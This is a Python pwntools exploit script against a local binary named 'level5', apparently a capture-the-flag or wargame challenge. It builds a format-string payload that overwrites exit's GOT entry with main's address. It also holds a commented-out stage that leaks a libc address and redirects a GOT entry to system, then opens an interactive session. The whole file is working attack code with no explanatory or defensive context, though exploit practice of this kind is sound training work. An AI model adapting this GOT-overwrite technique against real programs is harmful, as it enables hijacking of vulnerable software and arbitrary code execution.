from pwn import *
exit_got = 0x804a020
main = 0x80485a4

p = process("./level5")

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

#payload = p32(exit_got)
payload =  b"%8" + b"c"
payload += b"%20$hhn"
payload += b"%156" + b"c"
payload += b"%21$hhn"
payload += b"%993c"
payload += b"%22$hn"
payload += b"aaa"
payload += p32(exit_got + 3)
payload += p32(exit_got)
payload += p32(exit_got + 1)




print(fmtstr_payload(11, {exit_got : main}))

print(payload)
pause()
p.sendlineafter(b"!\n", payload)

#p.sendlineafter(b"!\n", payload)
#payload = b"%8$s"
#payload += p32(0x804a018)


#print(p.recvline())
'''
leak = u32(p.recv(4).strip(b"\n").ljust(4, b"\x00")) + 0x610b8

log.info("puts@libc : "+hex(leak))
libc.address = leak - libc.symbols['puts']

payload = fmtstr_payload(11, {0x804a00c: libc.symbols['system']})
pause()
p.sendlineafter(b"!\n", payload)
'''
p.interactive()